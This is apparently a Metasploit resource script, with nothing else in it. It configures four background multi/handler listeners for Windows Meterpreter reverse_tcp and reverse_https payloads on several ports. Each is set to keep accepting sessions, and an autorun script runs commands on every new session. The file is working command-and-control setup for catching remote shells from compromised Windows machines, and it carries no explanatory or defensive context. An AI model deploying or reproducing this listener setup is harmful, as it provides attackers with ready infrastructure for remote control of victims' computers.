use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 64999
set ExitOnSession false
exploit -j -z

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 64998
set ExitOnSession false
exploit -j -z

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 64997
set ExitOnSession false
exploit -j -z

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j -z

set AutoRunScript multi_console_command -rc /opt/metasploit-framework/antirun.rs
